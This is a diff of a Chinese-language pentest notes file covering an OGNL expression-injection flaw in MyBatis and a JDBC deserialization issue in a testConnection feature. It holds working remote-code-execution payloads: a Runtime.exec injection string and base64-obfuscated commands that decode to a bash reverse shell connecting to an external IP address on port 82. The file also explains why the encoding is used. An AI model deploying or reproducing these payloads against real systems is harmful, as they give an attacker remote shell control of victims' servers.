@@ -34,10 +34,15 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4yNTUuMTY2LjEyLzgyIDA+JjE=}|{base64,
 
 ### mybaits
 mybaits2.2存在ongl表达式注入漏洞
-
-```ongl
-${@java.lang.Runtime@getRuntime().exec("open /System/Applications/Calculator.app")}
+#ongl 
+```java
+${@java.lang.Runtime@getRuntime().exec("calc")}
+//反弹shell需要{},使用base64编码
+${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzgxTkM0eU5UVXVNVFkyTGpFeUx6Z3lJREErSmpFPX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9')))}
 ```
+
+### testConnection
+会进行一个数据库的test连接,存在jdbc反序列化漏洞
 
 # reverse
 
